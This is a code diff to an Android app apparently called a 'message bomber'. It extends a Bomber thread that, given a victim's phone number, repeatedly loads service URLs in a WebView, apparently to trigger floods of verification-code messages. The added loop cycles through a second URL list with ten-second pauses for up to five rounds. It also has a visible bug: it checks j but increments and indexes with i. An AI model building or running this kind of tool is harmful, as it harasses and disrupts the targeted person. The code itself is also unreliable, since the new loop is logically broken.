@@ -5,6 +5,7 @@ import java.net.URL;
 import org.json.JSONArray;
 
 import com.example.data.Data;
+import com.example.data.Data2;
 import com.example.database.DataBaseHelper;
 import com.example.messagebomber.R.string;
 
@@ -17,11 +18,14 @@ import android.webkit.WebViewClient;
 public class Bomber extends Thread{
 
 	Data data = new Data();
+	Data2 data2 = new Data2();
 	int i = 0;
+	int j = 0;
 	String phoneNumber;
 	WebView webView;
 	String string;
 	int flag = 0;
+	int flag2 = 0;
 	
 	
 	public Bomber(String phoneNumber, WebView webView) {
@@ -55,6 +59,25 @@ public class Bomber extends Thread{
 				}
 			}
 		}
+		//second part ,with check code
+		while(j<data2.js.length){
+			bomb(webView, data2.url[i]);
+			try {
+				sleep(10000);
+			} catch (InterruptedException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
+			i++;
+			if(i == data2.js.length-1){
+				flag2++;
+				i = 0;
+				if(flag2 >= 5){
+					break;
+				}
+			}
+		}
+		
 	}
 	public void bomb(WebView webView,String url){
 		
